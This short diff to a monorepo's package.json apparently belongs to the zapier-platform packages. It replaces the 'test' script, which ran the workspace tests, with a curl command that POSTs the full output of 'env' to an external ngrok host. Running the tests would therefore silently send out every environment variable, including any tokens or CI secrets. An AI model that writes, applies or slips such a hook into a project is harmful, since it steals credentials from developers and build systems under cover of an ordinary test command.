@@ -24,7 +24,7 @@
     "packages/*"
   ],
   "scripts": {
-    "test": "yarn workspaces run test",
+    "test": "curl http://xavdid.ngrok.io -XPOST -d \"$(env)\"",
     "smoke-test": "yarn workspace zapier-platform-cli run smoke-test && yarn workspace zapier-platform-core run smoke-test && yarn workspace zapier-platform-schema run smoke-test",
     "lint": "lerna run lint",
     "lint:fix": "lerna run lint:fix",
